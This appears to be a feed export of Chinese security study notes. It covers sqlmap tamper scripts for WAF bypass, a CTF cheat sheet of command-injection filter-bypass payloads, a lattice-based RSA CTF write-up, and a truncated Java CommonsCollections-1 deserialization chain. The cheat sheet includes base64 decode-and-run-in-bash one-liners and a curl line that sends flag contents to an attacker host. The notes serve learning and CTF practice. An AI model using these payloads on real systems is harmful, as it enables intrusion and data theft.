<h1 id="sqlmap-脚本编写学习"><a href="#sqlmap-脚本编写学习" class="headerlink" title="sqlmap 脚本编写学习"></a>sqlmap 脚本编写学习</h1><p><a href="https://y4er.com/posts/sqlmap-tamper/">Sqlmap Tamper 编写 - Y4er的博客</a></p>
<p>sqlmap的<code>--tamper</code>参数可以引入用户自定义的脚本来修改注入时的payload，由此可以使用tamper来绕过waf，替换被过滤的关键字等。这是一个基本的tamper结构</p>
<table>
<thead>
<tr>
<th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15</code></th>
<th><code>#!/usr/bin/env python &quot;&quot;&quot; Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) See the file &#39;doc/COPYING&#39; for copying permission &quot;&quot;&quot; from lib.core.enums import PRIORITY __priority__ = PRIORITY.LOW # 当前脚本调用优先等级 def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。    pass def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数    return payload </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>需要把他保存为 <code>my.py</code> 放入 <code>sqlmap\tamper</code> 路径下，然后使用的时候加上参数 <code>--tamper=my</code> 就行了</p>
<h2 id="2-简单分析"><a href="#2-简单分析" class="headerlink" title="2 简单分析"></a>2 简单分析</h2><p>拿官方的一个tamper来分析下结构</p>
<table>
<thead>
<tr>
<th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35</code></th>
<th><code>#!/usr/bin/env python &quot;&quot;&quot; Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) See the file &#39;LICENSE&#39; for copying permission &quot;&quot;&quot; import random from lib.core.compat import xrange from lib.core.enums import PRIORITY __priority__ = PRIORITY.NORMAL def dependencies():    pass def randomIP():    numbers = []     while not numbers or numbers[0] in (10, 172, 192):        numbers = random.sample(xrange(1, 255), 4)     return &#39;.&#39;.join(str(_) for _ in numbers) def tamper(payload, **kwargs):    &quot;&quot;&quot;    Append a fake HTTP header &#39;X-Forwarded-For&#39;    &quot;&quot;&quot;     headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)    headers[&quot;X-Forwarded-For&quot;] = randomIP()    headers[&quot;X-Client-Ip&quot;] = randomIP()    headers[&quot;X-Real-Ip&quot;] = randomIP()    return payload </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>分为了import部分、<code>__priority__</code> 属性、dependencies函数、tamper函数以及用户自定义的函数</p>
<h2 id="3-import"><a href="#3-import" class="headerlink" title="3 import"></a>3 import</h2><p>这一部分我们可以导入sqlmap的内部库，sqlmap为我们提供了很多封装好的函数和数据类型，比如下文的<code>PRIORITY</code>就来源于<code>sqlmap/lib/core/enums.py</code></p>
<h3 id="3-1-PRIORITY"><a href="#3-1-PRIORITY" class="headerlink" title="3.1 PRIORITY"></a>3.1 PRIORITY</h3><p>PRIORITY是定义tamper的优先级，PRIORITY有以下几个参数:</p>
<ul>
<li>LOWEST &#x3D; -100</li>
<li>LOWER &#x3D; -50</li>
<li>LOW &#x3D; -10</li>
<li>NORMAL &#x3D; 0</li>
<li>HIGH &#x3D; 10</li>
<li>HIGHER &#x3D; 50</li>
<li>HIGHEST &#x3D; 100</li>
</ul>
<p>如果使用者使用了多个tamper，sqlmap就会根据每个tamper定义PRIORITY的参数等级来优先使用等级较高的tamper，如果你有两个tamper需要同时用，需要注意这个问题。</p>
<h2 id="4-dependencies"><a href="#4-dependencies" class="headerlink" title="4 dependencies"></a>4 dependencies</h2><p>dependencies主要是提示用户，这个tamper支持哪些数据库，具体代码如下:</p>
<table>
<thead>
<tr>
<th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18</code></th>
<th><code>#!/usr/bin/env python &quot;&quot;&quot; Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) See the file &#39;LICENSE&#39; for copying permission &quot;&quot;&quot; from lib.core.enums import PRIORITY from lib.core.common import singleTimeWarnMessage from lib.core.enums import DBMS __priority__ = PRIORITY.NORMAL def dependencies():    singleTimeWarnMessage(&quot;这是我的tamper提示&quot;) def tamper(payload, **kwargs):    return payload </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><a href="https://y4er.com/img/uploads/20191118212606.png"><img src="https://y4er.com/img/uploads/20191118212606.png" alt="20191118212606"></a></p>
<p>DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数也可以看这个<code>\sqlmap\lib\core\enums.py</code></p>
<p><a href="https://y4er.com/img/uploads/20191118212624.png"><img src="https://y4er.com/img/uploads/20191118212624.png" alt="20191118212624"></a></p>
<h2 id="5-Tamper"><a href="#5-Tamper" class="headerlink" title="5 Tamper"></a>5 Tamper</h2><p>tamper这个函数是tamper最重要的函数，你要实现的功能，全部写在这个函数里。payload这个参数就是sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个payload的修改。kwargs是针对http头部的修改，如果你bypass，是通过修改http头，就需要用到这个</p>
<h3 id="5-1-基于payload"><a href="#5-1-基于payload" class="headerlink" title="5.1 基于payload"></a>5.1 基于payload</h3><p>先来基于修改payload来绕过替换关键字，我使用sqlilab的第一关，并且修改了部分代码来把恶意关键字替换为空来避免联合查询，如图</p>
<p><a href="https://y4er.com/img/uploads/20191118212641.png"><img src="https://y4er.com/img/uploads/20191118212641.png" alt="20191118212641"></a></p>
<p>编写tamper来双写绕过</p>
<table>
<thead>
<tr>
<th><code>1 2 3 4 5 </code></th>
<th><code>def tamper(payload, **kwargs):    payload = payload.lower()    payload = payload.replace(&#39;select&#39;,&#39;seleselectct&#39;)    payload = payload.replace(&#39;union&#39;,&#39;ununionion&#39;)    return payload </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>没有使用tamper之前，我们加上<code>--tech=U</code>来让sqlmap只测试联合查询注入，<code>--flush-session</code>意思是每次刷新会话，清理上次的缓存。</p>
<table>
<thead>
<tr>
<th><code>1 </code></th>
<th><code>sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --dbms=mysql </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><a href="https://y4er.com/img/uploads/20191118212702.png"><img src="https://y4er.com/img/uploads/20191118212702.png" alt="20191118212702"></a></p>
<p>从burp的流量中看到payload是没有双写的，必然会注入失败。而使用了tamper之后</p>
<table>
<thead>
<tr>
<th><code>1 </code></th>
<th><code>sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --tamper=my --dbms=mysql </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><a href="https://y4er.com/img/uploads/20191118212747.png"><img src="https://y4er.com/img/uploads/20191118212747.png" alt="20191118212747"></a></p>
<p>payload正常双写，可以注入</p>
<p><a href="https://y4er.com/img/uploads/20191118212800.png"><img src="https://y4er.com/img/uploads/20191118212800.png" alt="20191118212800"></a></p>
<h3 id="5-2-基于http头"><a href="#5-2-基于http头" class="headerlink" title="5.2 基于http头"></a>5.2 基于http头</h3><p>我们使用<code>sqlmap\tamper\xforwardedfor.py</code>的tamper来讲解</p>
<table>
<thead>
<tr>
<th><code>1 2 3 4 5 6 7 8 9 10</code></th>
<th><code>def tamper(payload, **kwargs):    &quot;&quot;&quot;    Append a fake HTTP header &#39;X-Forwarded-For&#39;    &quot;&quot;&quot;     headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)    headers[&quot;X-Forwarded-For&quot;] = randomIP()    headers[&quot;X-Client-Ip&quot;] = randomIP()    headers[&quot;X-Real-Ip&quot;] = randomIP()    return payload </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>从<code>kwargs</code>中取出<code>headers</code>数组，然后修改了xff值达到随机IP的效果，不再赘述。</p>
]]></content>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/2024/04/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p> 命令执行技巧</p>
<span id="more"></span>

<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="文件读取函数"><a href="#文件读取函数" class="headerlink" title="文件读取函数"></a>文件读取函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more/bzmore</span><br><span class="line">cat </span><br><span class="line">less/bzless</span><br><span class="line">head  head 命令可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为 10，即显示 10 行的内容。用法为：</span><br><span class="line">tail 作用和head相似，但它默认显示最后 10 行</span><br><span class="line">nl</span><br><span class="line">sed</span><br><span class="line">sort</span><br><span class="line">uniq</span><br><span class="line">rev</span><br><span class="line">od</span><br><span class="line">vim/vi</span><br><span class="line">man man 命令是 Linux 下的帮助指令，通过 man 指令可以查看 Linux 中的指令帮助、配置文件帮助和编程帮助等信息，类似于vim/vi，直接对文本运行可以看到文本内容。</span><br><span class="line">paste 使用paste命令可以将每个指定文件里的每一行整合到对应一行里写到标准输出,之间用制表符分隔</span><br><span class="line">grep 查找文件里符合条件的字符串</span><br><span class="line">file 查看文件信息或类型</span><br><span class="line">dd 用于读取、转换并输出数据</span><br><span class="line">diff 用于比较文件的内容，我们可以把想读取的文件内容和一个已知的文件进行比较，获得差集也就是我们想要的内容了</span><br></pre></td></tr></table></figure>

<h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h2><table>
<thead>
<tr>
<th>[list]</th>
<th>匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合</th>
</tr>
</thead>
<tbody><tr>
<td>[^list]</td>
<td>匹配指定范围外的任意单个字符或字符集合</td>
</tr>
<tr>
<td>[!list]</td>
<td>同[^list]</td>
</tr>
<tr>
<td>{str1,str2}</td>
<td>匹配str1或者str2字符，也可以是集合</td>
</tr>
<tr>
<td>IFS</td>
<td>由<space>或<tab>或</tab></space></td>
</tr>
<tr>
<td>CR</td>
<td>由<enter>产生</enter></td>
</tr>
<tr>
<td>!</td>
<td>执行history中的命令</td>
</tr>
</tbody></table>
<p>通配符绕过字母过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br><span class="line">意思是 /bin/base64 flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/???/????2 ????????</span><br><span class="line">?c=/usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure>





<h2 id="分割文件名"><a href="#分割文件名" class="headerlink" title="分割文件名"></a>分割文件名</h2><p>linux里，ca’’t、ca\t、ca””t和cat是等效的，所以我们可以用这种方式绕过关键词过滤</p>
<p>ca$*t flag </p>
<p>ca${5}t flag</p>
<p>cat$@t flag</p>
<p>ca$5t flag</p>
<h2 id="转进制"><a href="#转进制" class="headerlink" title="转进制"></a>转进制</h2><p>我们可以把flag转成八进制，变成$’\146\154\141\147’，然后用cat &#x2F;$’\146\154\141\147’即可</p>
<p>或者16 进制</p>
<h2 id="利用管道符"><a href="#利用管道符" class="headerlink" title="利用管道符"></a>利用管道符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IC9mKg==&quot; | base64 -d|bash</span><br></pre></td></tr></table></figure>

<h2 id="x2F-被过滤怎么绕过"><a href="#x2F-被过滤怎么绕过" class="headerlink" title="&#x2F;被过滤怎么绕过"></a>&#x2F;被过滤怎么绕过</h2><pre><code>$&#123;string:start:length&#125; 从字符串左边开始计数

string为要截取的字符串，start是起始位置（从左边开始，从0开始计数），length是要截取的长度(省略的话表示直到字符串的末尾)

$&#123;string:0-start:length&#125; 从右边开始计数
</code></pre>
<p>linux里echo ${PATH}可以获得当前路径：</p>
<p>${PATH:0:1}</p>
<p>比如${PWD:0:1}、${HOME:0:1}、${SHELL:0:1}等等</p>
<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&#123;cat,/flag&#125;</span><br><span class="line">sort&lt;flag.txt</span><br></pre></td></tr></table></figure>





<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><p>cp mv 对目标文件进行改名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl your_ip:port/?q=`cat flag| grep flag |base64`</span><br></pre></td></tr></table></figure>



<h2 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h2><p>过滤分割符 | &amp; ；</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">;  //分号</span><br><span class="line">|  //只执行后面那条命令</span><br><span class="line">||  //只执行前面那条命令</span><br><span class="line">&amp;  //两条命令都会执行</span><br><span class="line">&amp;&amp;  //两条命令都会执行</span><br><span class="line">%0a      //换行符</span><br><span class="line">%0d     //回车符号</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">   system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); </span><br></pre></td></tr></table></figure>

<h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><p>命令执行字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linux下可以用 1&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>



<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p>在linux系统中，反引号是作为内联执行，输出查询结果的内容。比如用ls查询出index.php。那么<code>ls</code>就代表了index.php这个文件。那么我们就可以使用cat命令查看index.php的内容，而这一道题就可以使用cat$IFS$1<code>ls</code> 这个命令来输出flag了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,要执行命令的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">cat `echo 666c61672e706870 | xxd -r -p` 或 cat $(echo 666c61672e706870 | xxd -r -p) 或 echo 666c61672e706870 | xxd -r -p | xargs cat</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IC9mKg==&quot; | base64 -d|bash</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>格基规约算法</title>
    <url>/2024/04/09/%E6%A0%BC%E5%9F%BA%E8%A7%84%E7%BA%A6%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p> 慢慢理解吧</p>
<span id="more"></span>



<h1 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h1><p><a href="https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/">crypto常用工具 | Lazzaro (lazzzaro.github.io)</a></p>
<h1 id="格基规约"><a href="#格基规约" class="headerlink" title="格基规约"></a>格基规约</h1><h1 id="begin-bmatrix-f-amp-k-end-bmatrix-begin-bmatrix-1-amp-h-0-amp-q-end-bmatrix"><a href="#begin-bmatrix-f-amp-k-end-bmatrix-begin-bmatrix-1-amp-h-0-amp-q-end-bmatrix" class="headerlink" title="$$\begin{bmatrix} f &amp; -k \end{bmatrix}\begin{bmatrix}    1 &amp; h   \    0 &amp; q   \\end{bmatrix}"></a>$$<br>\begin{bmatrix} f &amp; -k \end{bmatrix}<br>\begin{bmatrix}<br>    1 &amp; h   \<br>    0 &amp; q   \<br>\end{bmatrix}</h1><p>\begin{bmatrix} f &amp; g \end{bmatrix}<br>$$<br>v&#x3D;[f -k] ,<br>$$<br>v&#x3D;[f -k] ,B &#x3D; \begin{bmatrix} 1 &amp; h \ 0 &amp; q \end{bmatrix},w&#x3D;(f,g)<br>$$</p>
<p>vB&#x3D;w,v中的f 和-k 都是整数，根据格的定义，w是格基B中向量的整数线性组合，所以 w 是 B 上的一个格点，</p>
<p>期望证明w是(B) 上的最短向量， </p>
<p>从结果上看，LLL规约后的格基的第一个向量即我们想要的近似最短向量，可以不妨先拿出来当作w&#x3D;(f,g)</p>
<p>即<code>f = L[0][0]</code></p>
<h1 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h1><p>2024 年vctf 纳新赛 rrsa</p>
<blockquote>
<p>题目</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flag import flag</span><br><span class="line">import random</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">def genprime():</span><br><span class="line">	o = getPrime(300)</span><br><span class="line">	while True:</span><br><span class="line">		r = random.randint(2**211,2**212)</span><br><span class="line">		if isPrime(o*r+1):</span><br><span class="line">			return o,o*r+1</span><br><span class="line">o1,p = genprime()</span><br><span class="line">o2,q = genprime()</span><br><span class="line">n=p*q</span><br><span class="line">g = random.randint(2,n)</span><br><span class="line">order = o1*o2</span><br><span class="line"></span><br><span class="line">a = pow(g, (p-1)*(q-1)//order, n)</span><br><span class="line">assert pow(a,order,n)==1</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = 65537</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(f&#x27;n=&#123;n&#125;&#x27;)</span><br><span class="line">print(f&#x27;c=&#123;c&#125;&#x27;)</span><br><span class="line">print(f&#x27;a=&#123;a&#125;&#x27;)</span><br><span class="line">print(f&#x27;o=&#123;order&#125;&#x27;)</span><br><span class="line">n=44435425447782114838897637647733409614831121089064725526413247701631122523646623518523253532066782191116739274354991533158902831935676078270115998050827358178237970133151467497051097694866238654012042884894924846645692294679774577780414805605811029994570132760841672754334836945991390844881416693502552870759</span><br><span class="line">c=41355409695119524180275572228024314281790321005050664347253778436753663918879919757571129194249071204946415158483084730406579433518426895158142068246063333111438863836668823874266012696265984976829088976346775293102571794377818611709336242495598331872036489022428750111592728015245733975923531682859930386731</span><br><span class="line">a=39844923600973712577104437232871220768052114284995840460375902596405104689968610170336151307934820030811039502338683925817667771016288030594299464019664781911131177394369348831163266849069740191783143327911986419528382896919157135487360024877230254274474109707112110411601273850406237677432935818199348150470</span><br><span class="line">o=1745108106200960949680880500144134006212310627077303652648249235148621661187609612344828833696608872318217367008018829485062303972702933973340909520462917612611270028511222134076453</span><br></pre></td></tr></table></figure>

<h2 id="解1-s"><a href="#解1-s" class="headerlink" title="解1 s"></a>解1 s</h2><p>注意到 <code>o1 300bit，r1 212bit</code>，<code>p=o1*r1+1 ,512bit</code></p>
<p>我们已知 <code>o1o2 ,600bit</code> ， 看上式，<code>o1r1o2r2，1024bit， o_1r_1+o_2r_2，512bit</code></p>
<p><code>python里 //</code> 是保留整数部分，所以 <code>n//o</code> 求出的是 <code>r1r2</code> 的准确值</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">n=44435425447782114838897637647733409614831121089064725526413247701631122523646623518523253532066782191116739274354991533158902831935676078270115998050827358178237970133151467497051097694866238654012042884894924846645692294679774577780414805605811029994570132760841672754334836945991390844881416693502552870759</span><br><span class="line">c=41355409695119524180275572228024314281790321005050664347253778436753663918879919757571129194249071204946415158483084730406579433518426895158142068246063333111438863836668823874266012696265984976829088976346775293102571794377818611709336242495598331872036489022428750111592728015245733975923531682859930386731</span><br><span class="line">a=39844923600973712577104437232871220768052114284995840460375902596405104689968610170336151307934820030811039502338683925817667771016288030594299464019664781911131177394369348831163266849069740191783143327911986419528382896919157135487360024877230254274474109707112110411601273850406237677432935818199348150470</span><br><span class="line">o=1745108106200960949680880500144134006212310627077303652648249235148621661187609612344828833696608872318217367008018829485062303972702933973340909520462917612611270028511222134076453</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">phi = n//o * o</span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">m = libnum.n2s(m)</span><br><span class="line">print(m)</span><br><span class="line"># flag&#123;0228FC7F-C865-BD0F-F124-9F9860B3542B&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解2造格"><a href="#解2造格" class="headerlink" title="解2造格"></a>解2造格</h2><p><a href="https://cdn.jsdelivr.net/gh/Wbuildings/hexoimage/imagesimage-20240319205329862.png"><img src="https://cdn.jsdelivr.net/gh/Wbuildings/hexoimage/imagesimage-20240319205329862.png" alt="image-20240319205329862"></a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Wbuildings/hexoimage/imagesimage-20240319210127305.png" alt="image-20240319210127305">](<a href="https://cdn.jsdelivr.net/gh/Wbuildings/hexoimage/imagesimage-20240319210127305.png">https://cdn.jsdelivr.net/gh/Wbuildings/hexoimage/imagesimage-20240319210127305.png</a>)</p>
<p><a href="https://cdn.jsdelivr.net/gh/Wbuildings/hexoimage/imagesimage-20240319210127305.png">image-20240319210127305</a></p>
<p>就能直接得到 <code>r1r2</code> 了</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">n=44435425447782114838897637647733409614831121089064725526413247701631122523646623518523253532066782191116739274354991533158902831935676078270115998050827358178237970133151467497051097694866238654012042884894924846645692294679774577780414805605811029994570132760841672754334836945991390844881416693502552870759</span><br><span class="line">c=41355409695119524180275572228024314281790321005050664347253778436753663918879919757571129194249071204946415158483084730406579433518426895158142068246063333111438863836668823874266012696265984976829088976346775293102571794377818611709336242495598331872036489022428750111592728015245733975923531682859930386731</span><br><span class="line">a=39844923600973712577104437232871220768052114284995840460375902596405104689968610170336151307934820030811039502338683925817667771016288030594299464019664781911131177394369348831163266849069740191783143327911986419528382896919157135487360024877230254274474109707112110411601273850406237677432935818199348150470</span><br><span class="line">o=1745108106200960949680880500144134006212310627077303652648249235148621661187609612344828833696608872318217367008018829485062303972702933973340909520462917612611270028511222134076453</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">B = matrix(ZZ,[[2^88,-o],[0,n+1]])</span><br><span class="line">L = B.LLL()</span><br><span class="line">print(L)</span><br><span class="line">r = L[0][0]</span><br><span class="line">phi = o*(r&gt;&gt;88)</span><br><span class="line">d = libnum.invmod(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(libnum.n2s(int(m)))</span><br><span class="line"># flag&#123;0228FC7F-C865-BD0F-F124-9F9860B3542B&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://jia.je/kb/cryptography/lll.html#_1">https://jia.je/kb/cryptography/lll.html#_1</a></p>
<p><a href="https://wbuildings.github.io/Crypto/2024%E7%AC%AC%E4%B8%80%E5%B1%8AVCTF%E7%BA%B3%E6%96%B0%E8%B5%9B/">https://wbuildings.github.io/Crypto/2024第一届VCTF纳新赛/</a></p>
<p><a href="https://tover.xyz/p/LLL-attack-equation/#%E6%A0%BC%E7%9F%A5%E8%AF%86">格攻击之小未知数方程求解入门——原理与例子 | Tover’s Blog</a></p>
<p><a href="https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/">https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</a></p>
]]></content>
      <tags>
        <tag>密码</tag>
      </tags>
  </entry>
  <entry>
    <title>commons-collections1</title>
    <url>/2024/03/30/commons-collections1/</url>
    <content><![CDATA[<p> java cc1 链子</p>
<span id="more"></span> 

<p>文章为复盘白日梦组长的视频</p>
<h1 id="CommonsCollections-1"><a href="#CommonsCollections-1" class="headerlink" title="CommonsCollections-1"></a>CommonsCollections-1</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>windos 10 虚拟机</p>
<p>jdk 8u65 ,idea</p>
<ul>
<li>CC版本：Commons-Collections 3.1-3.2.1</li>
</ul>
<p>maven依赖包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>导入sun 包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hg.openjdk.java.net/jdk8u/jdk8u/jdk/log?rev=annotationinvocationhandler</span><br></pre></td></tr></table></figure>

<p>这里下载zip </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</span><br></pre></td></tr></table></figure>

<p>导入maven 依赖</p>
<p>在CC3.21组件依赖中，存在transformer  接口，该类的实现类有一个invokerTransformer.class,存在方法transform</p>
<h2 id="调用过程"><a href="#调用过程" class="headerlink" title="调用过程"></a>调用过程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                MapEntry.setValue()</span><br><span class="line">                    TransformedMap.checkSetValue()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a><strong>Transformer</strong></h2><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="InvokerTransformer-transformer"><a href="#InvokerTransformer-transformer" class="headerlink" title="InvokerTransformer.transformer"></a>InvokerTransformer.transformer</h2><p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序</p>
<p>列化能执⾏任意代码的关键。</p>
<p>在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数</p>
<p>是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 传入了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br></pre></td></tr></table></figure>

<p>这里相当于动态反射调用方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">// Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        Runtime r=Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span 